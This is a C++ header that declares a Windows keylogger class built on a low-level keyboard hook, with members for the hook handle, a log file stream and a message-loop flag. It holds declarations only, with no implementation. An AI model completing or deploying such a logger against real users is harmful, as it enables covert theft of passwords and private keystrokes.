#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <windows.h>
#include <fstream>
#include <string>

class KeyLogger {
public:
    KeyLogger(const std::string& filename);

    // Starts the hook loop and begins logging keys to file
    void start();

    // Stops the hook and exits the message loop
    void stop();

private:
    // Keyboard hook procedure for low-level key capture
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    static std::ofstream outFile;   // File stream to store keystrokes
    static HHOOK hook;              // Windows hook handle
    static std::string filePath;    // Log file path
    static bool running;            // Control flag for message loop
    static DWORD threadId;          // ID of the logging thread
};

#endif // KEYLOGGER_HPP
